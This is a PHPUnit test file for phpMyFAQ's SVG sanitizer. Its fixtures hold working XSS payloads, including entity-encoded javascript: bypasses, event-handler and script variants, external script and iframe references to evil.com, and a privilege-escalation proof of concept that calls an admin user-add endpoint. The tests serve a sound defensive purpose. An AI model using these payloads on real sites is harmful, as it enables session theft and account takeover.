<?php

/**
 * SVG Sanitizer Regex Test
 *
 * This Source Code Form is subject to the terms of the Mozilla Public License,
 * v. 2.0. If a copy of the MPL was not distributed with this file, You can
 * obtain one at https://mozilla.org/MPL/2.0/.
 *
 * @package   phpMyFAQ
 * @author    Thorsten Rinne <thorsten@phpmyfaq.de>
 * @copyright 2026 phpMyFAQ Team
 * @license   https://www.mozilla.org/MPL/2.0/ Mozilla Public License Version 2.0
 * @link      https://www.phpmyfaq.de
 * @since     2026-01-15
 */

declare(strict_types=1);

namespace phpMyFAQ\Helper;

use PHPUnit\Framework\TestCase;

class SvgSanitizerTest extends TestCase
{
    private SvgSanitizer $sanitizer;
    private string $testDir;

    protected function setUp(): void
    {
        $this->sanitizer = new SvgSanitizer();
        $this->testDir = sys_get_temp_dir() . '/svg_regex_test_' . uniqid();
        mkdir($this->testDir);
    }

    protected function tearDown(): void
    {
        // Clean up test files
        if (is_dir($this->testDir)) {
            $files = glob($this->testDir . '/*');
            foreach ($files as $file) {
                if (is_file($file)) {
                    unlink($file);
                }
            }
            rmdir($this->testDir);
        }
    }

    public function testIsSafeReturnsTrueForSafeSvg(): void
    {
        $safeSvg = <<<SVG
            <?xml version="1.0" encoding="UTF-8"?>
            <svg xmlns="http://www.w3.org/2000/svg" width="100" height="100">
                <circle cx="50" cy="50" r="40" fill="blue"/>
                <rect x="10" y="10" width="20" height="20" fill="red"/>
            </svg>
            SVG;

        $filePath = $this->testDir . '/safe.svg';
        file_put_contents($filePath, $safeSvg);

        $this->assertTrue($this->sanitizer->isSafe($filePath));
    }

    public function testIsSafeReturnsFalseForSvgWithOnload(): void
    {
        $maliciousSvg = <<<SVG
            <svg xmlns="http://www.w3.org/2000/svg" onload="alert('XSS')">
                <circle cx="50" cy="50" r="40" fill="blue"/>
            </svg>
            SVG;

        $filePath = $this->testDir . '/malicious_onload.svg';
        file_put_contents($filePath, $maliciousSvg);

        $this->assertFalse($this->sanitizer->isSafe($filePath));
    }

    public function testIsSafeReturnsFalseForSvgWithScript(): void
    {
        $maliciousSvg = <<<SVG
            <svg xmlns="http://www.w3.org/2000/svg">
                <script>alert('XSS')</script>
                <circle cx="50" cy="50" r="40" fill="blue"/>
            </svg>
            SVG;

        $filePath = $this->testDir . '/malicious_script.svg';
        file_put_contents($filePath, $maliciousSvg);

        $this->assertFalse($this->sanitizer->isSafe($filePath));
    }

    public function testIsSafeReturnsFalseForSvgWithForeignObject(): void
    {
        $maliciousSvg = <<<SVG
            <svg xmlns="http://www.w3.org/2000/svg">
                <foreignObject width="100" height="100">
                    <body xmlns="http://www.w3.org/1999/xhtml">
                        <script>alert('XSS')</script>
                    </body>
                </foreignObject>
            </svg>
            SVG;

        $filePath = $this->testDir . '/malicious_foreign.svg';
        file_put_contents($filePath, $maliciousSvg);

        $this->assertFalse($this->sanitizer->isSafe($filePath));
    }

    public function testIsSafeReturnsFalseForSvgWithJavascriptUrl(): void
    {
        $maliciousSvg = <<<SVG
            <svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">
                <a xlink:href="javascript:alert('XSS')">
                    <circle cx="50" cy="50" r="40" fill="blue"/>
                </a>
            </svg>
            SVG;

        $filePath = $this->testDir . '/malicious_javascript.svg';
        file_put_contents($filePath, $maliciousSvg);

        $this->assertFalse($this->sanitizer->isSafe($filePath));
    }

    public function testIsSafeReturnsFalseForEntityEncodedJavascriptUrl(): void
    {
        // Key bypass: &#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58; decodes to "javascript:"
        $maliciousSvg = <<<'SVG'
            <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 200 200">
              <a href="&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;alert(document.domain)">
                <text x="20" y="50" font-size="16" fill="red">Click for XSS</text>
              </a>
            </svg>
            SVG;

        $filePath = $this->testDir . '/malicious_entity_encoded.svg';
        file_put_contents($filePath, $maliciousSvg);

        $this->assertFalse($this->sanitizer->isSafe($filePath));
    }

    public function testIsSafeReturnsFalseForHexEncodedJavascriptUrl(): void
    {
        // Hex entity bypass: &#x6A;&#x61;&#x76;&#x61;... → javascript:
        $maliciousSvg = <<<'SVG'
            <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 200 200">
              <a href="&#x6A;&#x61;&#x76;&#x61;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;&#x3A;alert(1)">
                <text x="20" y="50">Click</text>
              </a>
            </svg>
            SVG;

        $filePath = $this->testDir . '/malicious_hex_encoded.svg';
        file_put_contents($filePath, $maliciousSvg);

        $this->assertFalse($this->sanitizer->isSafe($filePath));
    }

    public function testIsSafeReturnsFalseForAnimateElement(): void
    {
        $maliciousSvg = <<<SVG
            <svg xmlns="http://www.w3.org/2000/svg">
                <animate attributeName="href" values="javascript:alert(1)" />
                <circle cx="50" cy="50" r="40" fill="blue"/>
            </svg>
            SVG;

        $filePath = $this->testDir . '/malicious_animate.svg';
        file_put_contents($filePath, $maliciousSvg);

        $this->assertFalse($this->sanitizer->isSafe($filePath));
    }

    public function testIsSafeReturnsFalseForSetElement(): void
    {
        $maliciousSvg = <<<SVG
            <svg xmlns="http://www.w3.org/2000/svg">
                <set attributeName="onload" to="alert(1)" />
                <circle cx="50" cy="50" r="40" fill="blue"/>
            </svg>
            SVG;

        $filePath = $this->testDir . '/malicious_set.svg';
        file_put_contents($filePath, $maliciousSvg);

        $this->assertFalse($this->sanitizer->isSafe($filePath));
    }

    public function testIsSafeReturnsFalseForUseElement(): void
    {
        $maliciousSvg = <<<SVG
            <svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">
                <use xlink:href="data:image/svg+xml;base64,PHN2Zz4..." />
            </svg>
            SVG;

        $filePath = $this->testDir . '/malicious_use.svg';
        file_put_contents($filePath, $maliciousSvg);

        $this->assertFalse($this->sanitizer->isSafe($filePath));
    }

    public function testIsSafeReturnsFalseForPrivilegeEscalationPoC(): void
    {
        // Exact PoC from vulnerability report
        $maliciousSvg = <<<'SVG'
            <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 500 300">
              <rect width="500" height="300" fill="#f8f9fa"/>
              <text x="250" y="100" text-anchor="middle" font-size="22" fill="#333">System Notice</text>
              <a href="&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;fetch('/admin/api/user/add')">
                <rect x="150" y="170" width="200" height="50" rx="8" fill="#0d6efd"/>
                <text x="250" y="200" text-anchor="middle" font-size="16" fill="white">View Update</text>
              </a>
            </svg>
            SVG;

        $filePath = $this->testDir . '/privilege_escalation.svg';
        file_put_contents($filePath, $maliciousSvg);

        $this->assertFalse($this->sanitizer->isSafe($filePath));
    }

    public function testSanitizeRemovesScriptTags(): void
    {
        $maliciousSvg = <<<SVG
            <svg xmlns="http://www.w3.org/2000/svg">
                <script>alert('XSS')</script>
                <circle cx="50" cy="50" r="40" fill="blue"/>
            </svg>
            SVG;

        $filePath = $this->testDir . '/to_sanitize_script.svg';
        file_put_contents($filePath, $maliciousSvg);

        $this->assertTrue($this->sanitizer->sanitize($filePath));

        $sanitizedContent = file_get_contents($filePath);
        $this->assertStringNotContainsString('script', $sanitizedContent);
        $this->assertStringNotContainsString('alert', $sanitizedContent);
        $this->assertStringContainsString('circle', $sanitizedContent);
    }

    public function testSanitizeRemovesEventHandlers(): void
    {
        $maliciousSvg = <<<SVG
            <svg xmlns="http://www.w3.org/2000/svg" onload="alert('XSS')">
                <circle cx="50" cy="50" r="40" fill="blue" onclick="alert('click')"/>
            </svg>
            SVG;

        $filePath = $this->testDir . '/to_sanitize_events.svg';
        file_put_contents($filePath, $maliciousSvg);

        $this->assertTrue($this->sanitizer->sanitize($filePath));

        $sanitizedContent = file_get_contents($filePath);
        $this->assertStringNotContainsString('onload', $sanitizedContent);
        $this->assertStringNotContainsString('onclick', $sanitizedContent);
        $this->assertStringContainsString('circle', $sanitizedContent);
    }

    public function testSanitizeRemovesForeignObject(): void
    {
        $maliciousSvg = <<<SVG
            <svg xmlns="http://www.w3.org/2000/svg">
                <circle cx="50" cy="50" r="40" fill="blue"/>
                <foreignObject width="100" height="100">
                    <body xmlns="http://www.w3.org/1999/xhtml">
                        <div>content</div>
                    </body>
                </foreignObject>
            </svg>
            SVG;

        $filePath = $this->testDir . '/to_sanitize_foreign.svg';
        file_put_contents($filePath, $maliciousSvg);

        $this->assertTrue($this->sanitizer->sanitize($filePath));

        $sanitizedContent = file_get_contents($filePath);
        $this->assertStringNotContainsString('foreignObject', $sanitizedContent);
        $this->assertStringContainsString('circle', $sanitizedContent);
    }

    public function testSanitizeRemovesJavascriptUrls(): void
    {
        $maliciousSvg = <<<SVG
            <svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">
                <a xlink:href="javascript:alert('XSS')">
                    <circle cx="50" cy="50" r="40" fill="blue"/>
                </a>
            </svg>
            SVG;

        $filePath = $this->testDir . '/to_sanitize_js_url.svg';
        file_put_contents($filePath, $maliciousSvg);

        $this->assertTrue($this->sanitizer->sanitize($filePath));

        $sanitizedContent = file_get_contents($filePath);
        $this->assertStringNotContainsString('javascript:', $sanitizedContent);
        $this->assertStringContainsString('circle', $sanitizedContent);
    }

    public function testSanitizeRemovesEntityEncodedJavascriptUrls(): void
    {
        $maliciousSvg = <<<'SVG'
            <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 200 200">
              <a href="&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;alert(document.domain)">
                <text x="20" y="50" font-size="16" fill="red">Click for XSS</text>
              </a>
            </svg>
            SVG;

        $filePath = $this->testDir . '/to_sanitize_entity_js.svg';
        file_put_contents($filePath, $maliciousSvg);

        $this->assertTrue($this->sanitizer->sanitize($filePath));

        $sanitizedContent = file_get_contents($filePath);
        $this->assertStringNotContainsString('javascript', $sanitizedContent);
        $this->assertStringContainsString('text', $sanitizedContent);
    }

    public function testSanitizePreservesSafeContent(): void
    {
        $safeSvg = <<<SVG
            <svg xmlns="http://www.w3.org/2000/svg" width="100" height="100" viewBox="0 0 100 100">
                <circle cx="50" cy="50" r="40" fill="blue" stroke="red" stroke-width="2"/>
                <rect x="10" y="10" width="30" height="30" fill="green" opacity="0.5"/>
            </svg>
            SVG;

        $filePath = $this->testDir . '/safe_content.svg';
        file_put_contents($filePath, $safeSvg);

        $this->assertTrue($this->sanitizer->sanitize($filePath));

        $sanitizedContent = file_get_contents($filePath);
        $this->assertStringContainsString('width="100"', $sanitizedContent);
        $this->assertStringContainsString('fill="blue"', $sanitizedContent);
        $this->assertStringContainsString('stroke="red"', $sanitizedContent);
        $this->assertStringContainsString('circle', $sanitizedContent);
        $this->assertStringContainsString('rect', $sanitizedContent);
    }

    public function testSanitizeReturnsFalseForNonExistentFile(): void
    {
        $this->assertFalse($this->sanitizer->sanitize($this->testDir . '/nonexistent.svg'));
    }

    public function testIsSafeReturnsFalseForNonExistentFile(): void
    {
        $this->assertFalse($this->sanitizer->isSafe($this->testDir . '/nonexistent.svg'));
    }

    public function testSanitizeReturnsFalseForNonSvgContent(): void
    {
        $filePath = $this->testDir . '/plain.txt';
        file_put_contents($filePath, 'plain text content');

        $this->assertFalse($this->sanitizer->sanitize($filePath));
    }

    public function testSanitizeRemovesCSSExpressions(): void
    {
        $maliciousSvg = <<<SVG
            <svg xmlns="http://www.w3.org/2000/svg">
                <circle cx="50" cy="50" r="40" style="fill: expression(alert('XSS'))"/>
            </svg>
            SVG;

        $filePath = $this->testDir . '/malicious_css.svg';
        file_put_contents($filePath, $maliciousSvg);

        $this->assertTrue($this->sanitizer->sanitize($filePath));

        $sanitizedContent = file_get_contents($filePath);
        $this->assertStringNotContainsString('expression(', $sanitizedContent);
        $this->assertStringContainsString('circle', $sanitizedContent);
    }

    public function testSanitizeRemovesDataTextHtmlUrls(): void
    {
        $maliciousSvg = <<<'SVG'
            <svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">
                <image xlink:href="data:text/html,%3Cscript%3Ealert%28%27XSS%27%29%3C%2Fscript%3E"/>
            </svg>
            SVG;

        $filePath = $this->testDir . '/malicious_data_url.svg';
        file_put_contents($filePath, $maliciousSvg);

        $this->assertTrue($this->sanitizer->sanitize($filePath));

        $sanitizedContent = file_get_contents($filePath);
        $this->assertStringNotContainsString('data:text/html', $sanitizedContent);
    }

    public function testDetectIssuesReturnsEmptyForSafeSvg(): void
    {
        $safeSvg = '<svg><circle cx="50" cy="50" r="40"/></svg>';
        $issues = $this->sanitizer->detectIssues($safeSvg);
        $this->assertEmpty($issues);
    }

    public function testDetectIssuesReturnsProblemsForMaliciousSvg(): void
    {
        $maliciousSvg = '<svg onload="alert(1)"><script>bad()</script></svg>';
        $issues = $this->sanitizer->detectIssues($maliciousSvg);
        $this->assertNotEmpty($issues);
        $this->assertGreaterThanOrEqual(2, count($issues)); // Should detect both onload and script
    }

    public function testShouldRejectReturnsTrueForMaliciousSvg(): void
    {
        $maliciousSvg = '<svg onload="alert(1)"><circle/></svg>';
        $filePath = $this->testDir . '/reject_test.svg';
        file_put_contents($filePath, $maliciousSvg);

        $this->assertTrue($this->sanitizer->shouldReject($filePath));
    }

    public function testShouldRejectReturnsFalseForSafeSvg(): void
    {
        $safeSvg = '<svg><circle cx="50" cy="50" r="40"/></svg>';
        $filePath = $this->testDir . '/accept_test.svg';
        file_put_contents($filePath, $safeSvg);

        $this->assertFalse($this->sanitizer->shouldReject($filePath));
    }

    public function testIsSafeReturnsFalseForDoubleEncodedEntities(): void
    {
        // Double-encoded: &#38;#106; → &#106; → j (after two decode rounds)
        $maliciousSvg = <<<'SVG'
            <svg xmlns="http://www.w3.org/2000/svg">
              <a href="&#38;#106;&#38;#97;&#38;#118;&#38;#97;&#38;#115;&#38;#99;&#38;#114;&#38;#105;&#38;#112;&#38;#116;&#38;#58;alert(1)">
                <text x="20" y="50">Click</text>
              </a>
            </svg>
            SVG;

        $filePath = $this->testDir . '/malicious_double_encoded.svg';
        file_put_contents($filePath, $maliciousSvg);

        $this->assertFalse($this->sanitizer->isSafe($filePath));
    }

    public function testIsSafeReturnsFalseForVbscriptUrl(): void
    {
        $maliciousSvg = <<<SVG
            <svg xmlns="http://www.w3.org/2000/svg">
                <a href="vbscript:MsgBox('XSS')">
                    <circle cx="50" cy="50" r="40" fill="blue"/>
                </a>
            </svg>
            SVG;

        $filePath = $this->testDir . '/malicious_vbscript.svg';
        file_put_contents($filePath, $maliciousSvg);

        $this->assertFalse($this->sanitizer->isSafe($filePath));
    }

    // =========================================================================
    // Encoding bypass attack vectors
    // =========================================================================

    public function testIsSafeReturnsFalseForMixedDecimalAndHexEntities(): void
    {
        // Mix of decimal &#106; and hex &#x61; entities spelling "javascript:"
        $maliciousSvg = <<<'SVG'
            <svg xmlns="http://www.w3.org/2000/svg">
              <a href="&#106;&#x61;&#118;&#x61;&#115;&#x63;&#114;&#x69;&#112;&#x74;&#58;alert(1)">
                <text x="10" y="20">Click</text>
              </a>
            </svg>
            SVG;

        $filePath = $this->testDir . '/mixed_entities.svg';
        file_put_contents($filePath, $maliciousSvg);

        $this->assertFalse($this->sanitizer->isSafe($filePath));
    }

    public function testIsSafeReturnsFalseForUppercaseHexEntities(): void
    {
        // Uppercase hex: &#x4A;&#x41;&#x56;... → JAVASCRIPT:
        $maliciousSvg = <<<'SVG'
            <svg xmlns="http://www.w3.org/2000/svg">
              <a href="&#x4A;&#x41;&#x56;&#x41;&#x53;&#x43;&#x52;&#x49;&#x50;&#x54;&#x3A;alert(1)">
                <text x="10" y="20">Click</text>
              </a>
            </svg>
            SVG;

        $filePath = $this->testDir . '/upper_hex_entities.svg';
        file_put_contents($filePath, $maliciousSvg);

        $this->assertFalse($this->sanitizer->isSafe($filePath));
    }

    public function testIsSafeReturnsFalseForEntityEncodedScriptTag(): void
    {
        // &#60; = < and &#62; = > encoding the script tags themselves
        $maliciousSvg = <<<'SVG'
            <svg xmlns="http://www.w3.org/2000/svg">
                &#60;script&#62;alert('XSS')&#60;/script&#62;
                <circle cx="50" cy="50" r="40" fill="blue"/>
            </svg>
            SVG;

        $filePath = $this->testDir . '/entity_script_tag.svg';
        file_put_contents($filePath, $maliciousSvg);

        $this->assertFalse($this->sanitizer->isSafe($filePath));
    }

    public function testIsSafeReturnsFalseForEntityEncodedOnloadAttribute(): void
    {
        // Entity-encode the event handler name and value
        $maliciousSvg = <<<'SVG'
            <svg xmlns="http://www.w3.org/2000/svg" &#111;&#110;&#108;&#111;&#97;&#100;="alert(1)">
                <circle cx="50" cy="50" r="40" fill="blue"/>
            </svg>
            SVG;

        $filePath = $this->testDir . '/entity_onload.svg';
        file_put_contents($filePath, $maliciousSvg);

        $this->assertFalse($this->sanitizer->isSafe($filePath));
    }

    public function testIsSafeReturnsFalseForTripleEncodedEntities(): void
    {
        // Triple-encoded: &amp;amp;#106; → &amp;#106; → &#106; → j
        $maliciousSvg = <<<'SVG'
            <svg xmlns="http://www.w3.org/2000/svg">
              <a href="&amp;amp;#106;&amp;amp;#97;&amp;amp;#118;&amp;amp;#97;&amp;amp;#115;&amp;amp;#99;&amp;amp;#114;&amp;amp;#105;&amp;amp;#112;&amp;amp;#116;&amp;amp;#58;alert(1)">
                <text x="10" y="20">Click</text>
              </a>
            </svg>
            SVG;

        $filePath = $this->testDir . '/triple_encoded.svg';
        file_put_contents($filePath, $maliciousSvg);

        $this->assertFalse($this->sanitizer->isSafe($filePath));
    }

    public function testIsSafeReturnsFalseForEntityEncodedVbscript(): void
    {
        // &#118;&#98;&#115;&#99;&#114;&#105;&#112;&#116;&#58; = vbscript:
        $maliciousSvg = <<<'SVG'
            <svg xmlns="http://www.w3.org/2000/svg">
              <a href="&#118;&#98;&#115;&#99;&#114;&#105;&#112;&#116;&#58;MsgBox('XSS')">
                <circle cx="50" cy="50" r="40"/>
              </a>
            </svg>
            SVG;

        $filePath = $this->testDir . '/entity_vbscript.svg';
        file_put_contents($filePath, $maliciousSvg);

        $this->assertFalse($this->sanitizer->isSafe($filePath));
    }

    public function testIsSafeReturnsFalseForEntityEncodedDataUri(): void
    {
        // &#100;&#97;&#116;&#97;&#58; = data:
        $maliciousSvg = <<<'SVG'
            <svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">
              <a xlink:href="&#100;&#97;&#116;&#97;&#58;text/html,<script>alert(1)</script>">
                <circle cx="50" cy="50" r="40"/>
              </a>
            </svg>
            SVG;

        $filePath = $this->testDir . '/entity_data_uri.svg';
        file_put_contents($filePath, $maliciousSvg);

        $this->assertFalse($this->sanitizer->isSafe($filePath));
    }

    // =========================================================================
    // Event handler attack vectors
    // =========================================================================

    public function testIsSafeReturnsFalseForOnErrorHandler(): void
    {
        $maliciousSvg = <<<SVG
            <svg xmlns="http://www.w3.org/2000/svg">
                <image onerror="alert('XSS')" xlink:href="invalid"/>
            </svg>
            SVG;

        $filePath = $this->testDir . '/onerror.svg';
        file_put_contents($filePath, $maliciousSvg);

        $this->assertFalse($this->sanitizer->isSafe($filePath));
    }

    public function testIsSafeReturnsFalseForOnMouseOverHandler(): void
    {
        $maliciousSvg = <<<SVG
            <svg xmlns="http://www.w3.org/2000/svg">
                <circle cx="50" cy="50" r="40" onmouseover="alert('XSS')"/>
            </svg>
            SVG;

        $filePath = $this->testDir . '/onmouseover.svg';
        file_put_contents($filePath, $maliciousSvg);

        $this->assertFalse($this->sanitizer->isSafe($filePath));
    }

    public function testIsSafeReturnsFalseForOnFocusHandler(): void
    {
        $maliciousSvg = <<<SVG
            <svg xmlns="http://www.w3.org/2000/svg">
                <rect x="0" y="0" width="100" height="100" onfocus="alert('XSS')" tabindex="0"/>
            </svg>
            SVG;

        $filePath = $this->testDir . '/onfocus.svg';
        file_put_contents($filePath, $maliciousSvg);

        $this->assertFalse($this->sanitizer->isSafe($filePath));
    }

    public function testIsSafeReturnsFalseForOnClickHandler(): void
    {
        $maliciousSvg = <<<SVG
            <svg xmlns="http://www.w3.org/2000/svg">
                <rect x="0" y="0" width="100" height="100" onclick="alert('XSS')"/>
            </svg>
            SVG;

        $filePath = $this->testDir . '/onclick.svg';
        file_put_contents($filePath, $maliciousSvg);

        $this->assertFalse($this->sanitizer->isSafe($filePath));
    }

    public function testIsSafeReturnsFalseForOnBeginHandler(): void
    {
        $maliciousSvg = <<<SVG
            <svg xmlns="http://www.w3.org/2000/svg">
                <rect x="0" y="0" width="100" height="100" onbegin="alert('XSS')"/>
            </svg>
            SVG;

        $filePath = $this->testDir . '/onbegin.svg';
        file_put_contents($filePath, $maliciousSvg);

        $this->assertFalse($this->sanitizer->isSafe($filePath));
    }

    public function testIsSafeReturnsFalseForEventHandlerWithoutQuotes(): void
    {
        $maliciousSvg = <<<SVG
            <svg xmlns="http://www.w3.org/2000/svg">
                <circle cx="50" cy="50" r="40" onload=alert(1)/>
            </svg>
            SVG;

        $filePath = $this->testDir . '/event_no_quotes.svg';
        file_put_contents($filePath, $maliciousSvg);

        $this->assertFalse($this->sanitizer->isSafe($filePath));
    }

    public function testIsSafeReturnsFalseForEventHandlerWithSingleQuotes(): void
    {
        $maliciousSvg = <<<SVG
            <svg xmlns="http://www.w3.org/2000/svg">
                <circle cx="50" cy="50" r="40" onload='alert(document.cookie)'/>
            </svg>
            SVG;

        $filePath = $this->testDir . '/event_single_quotes.svg';
        file_put_contents($filePath, $maliciousSvg);

        $this->assertFalse($this->sanitizer->isSafe($filePath));
    }

    // =========================================================================
    // Script tag variations
    // =========================================================================

    public function testIsSafeReturnsFalseForSelfClosingScript(): void
    {
        $maliciousSvg = <<<SVG
            <svg xmlns="http://www.w3.org/2000/svg">
                <script/>
                <circle cx="50" cy="50" r="40"/>
            </svg>
            SVG;

        $filePath = $this->testDir . '/self_closing_script.svg';
        file_put_contents($filePath, $maliciousSvg);

        $this->assertFalse($this->sanitizer->isSafe($filePath));
    }

    public function testIsSafeReturnsFalseForScriptWithTypeAttribute(): void
    {
        $maliciousSvg = <<<SVG
            <svg xmlns="http://www.w3.org/2000/svg">
                <script type="text/javascript">alert('XSS')</script>
                <circle cx="50" cy="50" r="40"/>
            </svg>
            SVG;

        $filePath = $this->testDir . '/script_with_type.svg';
        file_put_contents($filePath, $maliciousSvg);

        $this->assertFalse($this->sanitizer->isSafe($filePath));
    }

    public function testIsSafeReturnsFalseForScriptWithXlinkHref(): void
    {
        $maliciousSvg = <<<SVG
            <svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">
                <script xlink:href="https://evil.com/xss.js"></script>
                <circle cx="50" cy="50" r="40"/>
            </svg>
            SVG;

        $filePath = $this->testDir . '/script_xlink.svg';
        file_put_contents($filePath, $maliciousSvg);

        $this->assertFalse($this->sanitizer->isSafe($filePath));
    }

    public function testIsSafeReturnsFalseForScriptWithHref(): void
    {
        $maliciousSvg = <<<SVG
            <svg xmlns="http://www.w3.org/2000/svg">
                <script href="https://evil.com/xss.js"></script>
                <circle cx="50" cy="50" r="40"/>
            </svg>
            SVG;

        $filePath = $this->testDir . '/script_href.svg';
        file_put_contents($filePath, $maliciousSvg);

        $this->assertFalse($this->sanitizer->isSafe($filePath));
    }

    public function testIsSafeReturnsFalseForMixedCaseScriptTag(): void
    {
        $maliciousSvg = <<<SVG
            <svg xmlns="http://www.w3.org/2000/svg">
                <ScRiPt>alert('XSS')</ScRiPt>
                <circle cx="50" cy="50" r="40"/>
            </svg>
            SVG;

        $filePath = $this->testDir . '/mixed_case_script.svg';
        file_put_contents($filePath, $maliciousSvg);

        $this->assertFalse($this->sanitizer->isSafe($filePath));
    }

    public function testIsSafeReturnsFalseForScriptInCdata(): void
    {
        $maliciousSvg = <<<SVG
            <svg xmlns="http://www.w3.org/2000/svg">
                <circle cx="50" cy="50" r="40"/>
                <![CDATA[<script>alert('XSS')</script>]]>
            </svg>
            SVG;

        $filePath = $this->testDir . '/script_cdata.svg';
        file_put_contents($filePath, $maliciousSvg);

        $this->assertFalse($this->sanitizer->isSafe($filePath));
    }

    // =========================================================================
    // Dangerous elements: animate, set, use, foreignObject variants
    // =========================================================================

    public function testIsSafeReturnsFalseForAnimateMotionElement(): void
    {
        $maliciousSvg = <<<SVG
            <svg xmlns="http://www.w3.org/2000/svg">
                <animateMotion path="M 0 0 L 100 100" dur="1s"/>
                <circle cx="50" cy="50" r="40"/>
            </svg>
            SVG;

        $filePath = $this->testDir . '/animate_motion.svg';
        file_put_contents($filePath, $maliciousSvg);

        $this->assertFalse($this->sanitizer->isSafe($filePath));
    }

    public function testIsSafeReturnsFalseForAnimateTransformElement(): void
    {
        $maliciousSvg = <<<SVG
            <svg xmlns="http://www.w3.org/2000/svg">
                <rect width="100" height="100">
                    <animateTransform attributeName="transform" type="rotate" values="0;360" dur="1s"/>
                </rect>
            </svg>
            SVG;

        $filePath = $this->testDir . '/animate_transform.svg';
        file_put_contents($filePath, $maliciousSvg);

        $this->assertFalse($this->sanitizer->isSafe($filePath));
    }

    public function testIsSafeReturnsFalseForUseElementWithJavascriptHref(): void
    {
        $maliciousSvg = <<<SVG
            <svg xmlns="http://www.w3.org/2000/svg">
                <use href="javascript:alert(1)"/>
            </svg>
            SVG;

        $filePath = $this->testDir . '/use_js_href.svg';
        file_put_contents($filePath, $maliciousSvg);

        $this->assertFalse($this->sanitizer->isSafe($filePath));
    }

    public function testIsSafeReturnsFalseForUseWithExternalSvgReference(): void
    {
        $maliciousSvg = <<<SVG
            <svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">
                <use xlink:href="https://evil.com/malicious.svg#payload"/>
            </svg>
            SVG;

        $filePath = $this->testDir . '/use_external_ref.svg';
        file_put_contents($filePath, $maliciousSvg);

        $this->assertFalse($this->sanitizer->isSafe($filePath));
    }

    public function testIsSafeReturnsFalseForHandlerElement(): void
    {
        $maliciousSvg = <<<SVG
            <svg xmlns="http://www.w3.org/2000/svg">
                <handler type="text/javascript">alert('XSS')</handler>
                <circle cx="50" cy="50" r="40"/>
            </svg>
            SVG;

        $filePath = $this->testDir . '/handler_element.svg';
        file_put_contents($filePath, $maliciousSvg);

        $this->assertFalse($this->sanitizer->isSafe($filePath));
    }

    public function testIsSafeReturnsFalseForListenerElement(): void
    {
        $maliciousSvg = <<<SVG
            <svg xmlns="http://www.w3.org/2000/svg">
                <listener event="click" handler="#myHandler"/>
                <circle cx="50" cy="50" r="40"/>
            </svg>
            SVG;

        $filePath = $this->testDir . '/listener_element.svg';
        file_put_contents($filePath, $maliciousSvg);

        $this->assertFalse($this->sanitizer->isSafe($filePath));
    }

    public function testIsSafeReturnsFalseForForeignObjectSelfClosing(): void
    {
        $maliciousSvg = <<<SVG
            <svg xmlns="http://www.w3.org/2000/svg">
                <foreignObject width="100" height="100"/>
                <circle cx="50" cy="50" r="40"/>
            </svg>
            SVG;

        $filePath = $this->testDir . '/foreign_self_closing.svg';
        file_put_contents($filePath, $maliciousSvg);

        $this->assertFalse($this->sanitizer->isSafe($filePath));
    }

    // =========================================================================
    // HTML injection elements in SVG context
    // =========================================================================

    public function testIsSafeReturnsFalseForIframeInSvg(): void
    {
        $maliciousSvg = <<<SVG
            <svg xmlns="http://www.w3.org/2000/svg">
                <iframe src="https://evil.com"></iframe>
                <circle cx="50" cy="50" r="40"/>
            </svg>
            SVG;

        $filePath = $this->testDir . '/iframe_in_svg.svg';
        file_put_contents($filePath, $maliciousSvg);

        $this->assertFalse($this->sanitizer->isSafe($filePath));
    }

    public function testIsSafeReturnsFalseForEmbedInSvg(): void
    {
        $maliciousSvg = <<<SVG
            <svg xmlns="http://www.w3.org/2000/svg">
                <embed src="https://evil.com/flash.swf" type="application/x-shockwave-flash"/>
                <circle cx="50" cy="50" r="40"/>
            </svg>
            SVG;

        $filePath = $this->testDir . '/embed_in_svg.svg';
        file_put_contents($filePath, $maliciousSvg);

        $this->assertFalse($this->sanitizer->isSafe($filePath));
    }

    public function testIsSafeReturnsFalseForObjectInSvg(): void
    {
        $maliciousSvg = <<<SVG
            <svg xmlns="http://www.w3.org/2000/svg">
                <object data="https://evil.com/payload.html" type="text/html"/>
                <circle cx="50" cy="50" r="40"/>
            </svg>
            SVG;

        $filePath = $this->testDir . '/object_in_svg.svg';
        file_put_contents($filePath, $maliciousSvg);

        $this->assertFalse($this->sanitizer->isSafe($filePath));
    }

    public function testIsSafeReturnsFalseForAppletInSvg(): void
    {
        $maliciousSvg = <<<SVG
            <svg xmlns="http://www.w3.org/2000/svg">
                <applet code="Evil.class" codebase="https://evil.com/"/>
                <circle cx="50" cy="50" r="40"/>
            </svg>
            SVG;

        $filePath = $this->testDir . '/applet_in_svg.svg';
        file_put_contents($filePath, $maliciousSvg);

        $this->assertFalse($this->sanitizer->isSafe($filePath));
    }

    public function testIsSafeReturnsFalseForMetaInSvg(): void
    {
        $maliciousSvg = <<<SVG
            <svg xmlns="http://www.w3.org/2000/svg">
                <meta http-equiv="refresh" content="0;url=https://evil.com"/>
                <circle cx="50" cy="50" r="40"/>
            </svg>
            SVG;

        $filePath = $this->testDir . '/meta_in_svg.svg';
        file_put_contents($filePath, $maliciousSvg);

        $this->assertFalse($this->sanitizer->isSafe($filePath));
    }

    public function testIsSafeReturnsFalseForBaseInSvg(): void
    {
        $maliciousSvg = <<<SVG
            <svg xmlns="http://www.w3.org/2000/svg">
                <base href="https://evil.com/"/>
                <circle cx="50" cy="50" r="40"/>
            </svg>
            SVG;

        $filePath = $this->testDir . '/base_in_svg.svg';
        file_put_contents($filePath, $maliciousSvg);

        $this->assertFalse($this->sanitizer->isSafe($filePath));
    }

